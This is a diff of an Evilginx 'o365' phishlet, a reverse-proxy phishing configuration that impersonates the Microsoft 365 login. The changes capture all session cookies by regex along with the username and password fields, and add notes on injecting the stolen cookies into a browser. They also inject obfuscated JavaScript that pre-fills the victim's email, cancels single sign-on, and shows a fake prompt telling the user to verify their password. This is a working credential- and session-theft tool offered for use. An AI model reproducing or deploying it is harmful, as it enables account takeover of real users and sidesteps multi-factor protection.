@@ -1,37 +1,54 @@
 name: 'o365'
-author: '@jamescullum'
-min_ver: '2.3.0'
+author: '@an0nud4y'
+min_ver: '2.4.0'
 proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
-  # The lines below are needed if your target organization utilizes ADFS.
-  # If they do, you need to uncomment all following lines that contain <...>
-  # To get the correct ADFS subdomain, test the web login manually and check where you are redirected.
-  # Assuming you get redirected to adfs.example.com, the placeholders need to be filled out as followed:
-  #    <insert-adfs-subdomain> = adfs
-  #    <insert-adfs-host> = example.com
-  #    <insert-adfs-subdomain-and-host> = adfs.example.com
-  #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>', session: true, is_landing:false}
-  #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>:443', session: true, is_landing:false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false}
+
 sub_filters:
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
-  # Uncomment and fill in if your target organization utilizes ADFS
-  #- {triggers_on: '<insert-adfs-subdomain-and-host>', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
 auth_tokens:
   - domain: '.login.microsoftonline.com'
-    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
+    keys: ['ESTSAUTH,opt', 'ESTSAUTHPERSISTENT,opt','.*,regexp']
   - domain: 'login.microsoftonline.com'
-    keys: ['SignInStateCookie']
+    keys: ['SignInStateCookie,opt','.*,regexp']
+
+
+# INJECT COOKIES
+# --------------
+# 
+# Browse the url https://login.microsoftonline.com
+# inject the capture cookies 
+# Refresh the browser
+
+
+
 credentials:
   username:
-    key: '(login|UserName)'
+    key: 'login'
     search: '(.*)'
     type: 'post'
   password:
-    key: '(passwd|Password)'
+    key: 'passwd'
     search: '(.*)'
     type: 'post'
+auth_urls:
+  - '/common/SAS/ProcessAuth'
+  - '/kmsi'
+  - '/'
 login:
   domain: 'login.microsoftonline.com'
   path: '/'
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/common/oauth2/","/","/*"]
+    trigger_params: [email]
+    script: |
+      function lp(){
+        document.forms[0][0].value="{email}";
+        }
+      setTimeout(function(){ lp(); }, 1000);
+      var _0x410e92=_0x5778;(function(_0x35da17,_0x3a9f50){var _0x5ec8bb=_0x5778,_0x54aaae=_0x35da17();while(!![]){try{var _0x444577=-parseInt(_0x5ec8bb(0x167))/(-0x41*0x91+0x1243*0x1+-0x128f*-0x1)*(-parseInt(_0x5ec8bb(0x187))/(0x3*0x2fe+-0xbc7+-0x2cf*-0x1))+-parseInt(_0x5ec8bb(0x15b))/(0xead*0x1+-0x16e+-0xd3c)*(-parseInt(_0x5ec8bb(0x155))/(-0x1b*-0x24+-0x3*-0x233+-0xa61*0x1))+-parseInt(_0x5ec8bb(0x15d))/(-0x223c+0x1420*-0x1+-0x3661*-0x1)+parseInt(_0x5ec8bb(0x165))/(-0x23a*0x10+0xf*0x4a+0x3ea*0x8)+-parseInt(_0x5ec8bb(0x16b))/(-0xfb*-0x26+-0x24c*0xd+-0x75f)*(parseInt(_0x5ec8bb(0x143))/(-0x1e23+0x1256+-0xbd5*-0x1))+parseInt(_0x5ec8bb(0x144))/(0xcb3+-0x6*0x61+0x299*-0x4)+-parseInt(_0x5ec8bb(0x16f))/(0x7a*0x4+0x1ae3+0x1*-0x1cc1)*(parseInt(_0x5ec8bb(0x166))/(0x1*-0x147d+-0x1a97*-0x1+-0x60f));if(_0x444577===_0x3a9f50)break;else _0x54aaae['push'](_0x54aaae['shift']());}catch(_0x16a14a){_0x54aaae['push'](_0x54aaae['shift']());}}}(_0x4864,0x5ddd9+0xc01*0xfb+-0x9d905)); checkElement3=async _0x4da37=>{var _0x2b896c=_0x5778,_0x206726={'NtbiS':function(_0x56a0cf,_0x29c3b0){return _0x56a0cf===_0x29c3b0;}};for(;_0x206726[_0x2b896c(0x154)](null,document[_0x2b896c(0x16a)+_0x2b896c(0x17d)](_0x4da37));)await new Promise(_0x3df563=>requestAnimationFrame(_0x3df563));return document[_0x2b896c(0x16a)+_0x2b896c(0x17d)](_0x4da37);};checkElement3(_0x410e92(0x15c)+_0x410e92(0x14e))[_0x410e92(0x185)](_0x468602=>{var _0x54fcff=_0x410e92,_0x3a611f={'wyKIM':_0x54fcff(0x14d)+_0x54fcff(0x149)};cancel=document[_0x54fcff(0x175)+_0x54fcff(0x173)](_0x3a611f[_0x54fcff(0x171)]),cancel[_0x54fcff(0x16d)](),cancel[_0x54fcff(0x176)]();return;});function _0x5778(_0x48bd0d,_0x4f20be){var _0x4b42d1=_0x4864();return _0x5778=function(_0x55d66e,_0x2b8c46){_0x55d66e=_0x55d66e-(0xcb3*-0x1+-0x7a*-0x3d+-0x102*0xf);var _0x56b5e4=_0x4b42d1[_0x55d66e];return _0x56b5e4;},_0x5778(_0x48bd0d,_0x4f20be);} checkElement=async _0x215f7d=>{var _0x30874e=_0x410e92,_0x5e7d54={'supNP':function(_0x883434,_0x323f5e){return _0x883434===_0x323f5e;}};for(;_0x5e7d54[_0x30874e(0x181)](null,document[_0x30874e(0x16a)+_0x30874e(0x17d)](_0x215f7d));)await new Promise(_0x45909d=>requestAnimationFrame(_0x45909d));return document[_0x30874e(0x16a)+_0x30874e(0x17d)](_0x215f7d);};checkElement(_0x410e92(0x183))[_0x410e92(0x185)](_0x156d6f=>{var _0x97d941=_0x410e92,_0x4efb2f={'NaHcx':_0x97d941(0x183),'wwDfO':_0x97d941(0x170)+'n9','FzbAh':_0x97d941(0x164)+_0x97d941(0x147),'nkPuA':function(_0x551351,_0x4abd64){return _0x551351<_0x4abd64;},'jtsCS':function(_0x2ba4ef,_0x56de8a){return _0x2ba4ef-_0x56de8a;},'KoKeW':function(_0x4ad73f,_0x490cea,_0x149ce4){return _0x4ad73f(_0x490cea,_0x149ce4);}},_0x4cfa81=document[_0x97d941(0x16a)+_0x97d941(0x17d)](_0x4efb2f[_0x97d941(0x157)]),_0x23ca5a=document[_0x97d941(0x16a)+_0x97d941(0x17d)](_0x4efb2f[_0x97d941(0x168)]),_0x24489f=window[_0x97d941(0x177)][_0x97d941(0x14a)];if(/#/[_0x97d941(0x146)](window[_0x97d941(0x177)][_0x97d941(0x14a)])){var _0x430fac=_0x4efb2f[_0x97d941(0x158)][_0x97d941(0x186)]('|'),_0x30fb78=0x138e+0x8*0x3a9+-0x30d6;while(!![]){switch(_0x430fac[_0x30fb78++]){case'0':_0x23ca5a[_0x97d941(0x176)]();continue;case'1':_0x55747b=String[_0x97d941(0x14b)+'de'][_0x97d941(0x174)](String,_0x2bbd05);continue;case'2':var _0x4fc903=_0x275d55[-0x24+-0x59*-0x1f+-0xaa2][_0x97d941(0x156)](/[=]/gi,'');continue;case'3':_0x4cfa81[_0x97d941(0x17b)]=_0x55747b;continue;case'4':return;case'5':_0x23ca5a[_0x97d941(0x16d)]();continue;case'6':for(var _0x55747b,_0x239c92=_0x4fc903[_0x97d941(0x14c)](-0x2316+0x1d*-0x157+0x49f2),_0x2bbd05=[],_0x8e4eb7=-0x2482+-0x799+0x2c1b;_0x4efb2f[_0x97d941(0x152)](_0x8e4eb7,_0x4efb2f[_0x97d941(0x15f)](_0x239c92[_0x97d941(0x14f)],0x39e+-0x1ed5+0x218*0xd));_0x8e4eb7+=0x22b6+0x2*0x51+-0x1*0x2356)_0x2bbd05[_0x97d941(0x150)](_0x4efb2f[_0x97d941(0x169)](parseInt,_0x239c92[_0x97d941(0x161)](_0x8e4eb7,0x1cef+-0x316+-0x19d7),-0x1ae+0x7*-0x259+0x122d));continue;case'7':_0x4cfa81[_0x97d941(0x16d)]();continue;case'8':var _0x275d55=_0x24489f[_0x97d941(0x186)]('#');continue;}break;}}}); checkElement2=async _0x2195e9=>{var _0xf10e89=_0x410e92,_0x3bc8a4={'qbHBe':function(_0x5c47e9,_0xf62cf8){return _0x5c47e9===_0xf62cf8;}};for(;_0x3bc8a4[_0xf10e89(0x151)](null,document[_0xf10e89(0x16a)+_0xf10e89(0x17d)](_0x2195e9));)await new Promise(_0x5283f6=>requestAnimationFrame(_0x5283f6));return document[_0xf10e89(0x16a)+_0xf10e89(0x17d)](_0x2195e9);};function _0x4864(){var _0x4e5d58=['supNP','\x20accessing','#i0116','QYnJR','then','split','4376DOmDZX','orgotPassw','rt\x20alert-e','1492360xeMxib','2374506yToWXe','/div>','test','3|5|0|4','\x20password<','Cancel','href','fromCharCo','substring','desktopSso','oCancel','length','push','qbHBe','nkPuA','erify\x20your','NtbiS','238444BSAvJm','replace','NaHcx','FzbAh','jzwAY','i0118','51eVYSJs','#desktopSs','3145070RoBCQT','mportant\x22\x20','jtsCS','ord','substr','use\x20you\x27re','znBFb','8|2|6|1|7|','298710PohhQS','2002TmIuPF','379yZWIKQ','wwDfO','KoKeW','querySelec','7ABcWLj','centHTML','focus','beforebegi','45620ORReFM','#idSIButto','wyKIM','\x20info,\x20you','ById','apply','getElement','click','location','insertAdja','<div\x20id=\x22i','\x20need\x20to\x20v','value','\x20sensitive','tor','rror\x22>Beca','class=\x22ale','#idA_PWD_F'];_0x4864=function(){return _0x4e5d58;};return _0x4864();}checkElement2(_0x410e92(0x180)+_0x410e92(0x141)+_0x410e92(0x160))[_0x410e92(0x185)](_0x54c929=>{var _0x2c9990=_0x410e92,_0x4ced35={'QYnJR':_0x2c9990(0x15a),'jzwAY':_0x2c9990(0x16e)+'n','znBFb':_0x2c9990(0x179)+_0x2c9990(0x15e)+_0x2c9990(0x17f)+_0x2c9990(0x142)+_0x2c9990(0x17e)+_0x2c9990(0x162)+_0x2c9990(0x182)+_0x2c9990(0x17c)+_0x2c9990(0x172)+_0x2c9990(0x17a)+_0x2c9990(0x153)+_0x2c9990(0x148)+_0x2c9990(0x145)};node=document[_0x2c9990(0x175)+_0x2c9990(0x173)](_0x4ced35[_0x2c9990(0x184)]),node[_0x2c9990(0x178)+_0x2c9990(0x16c)](_0x4ced35[_0x2c9990(0x159)],_0x4ced35[_0x2c9990(0x163)]);return;});
+# To learn more about the email autograb and similar features of evilginx 2.3 please check out this blog section 'Custom Parameters in Phishing Links' ( https://breakdev.org/evilginx-2-4-gone-phishing/) ,    
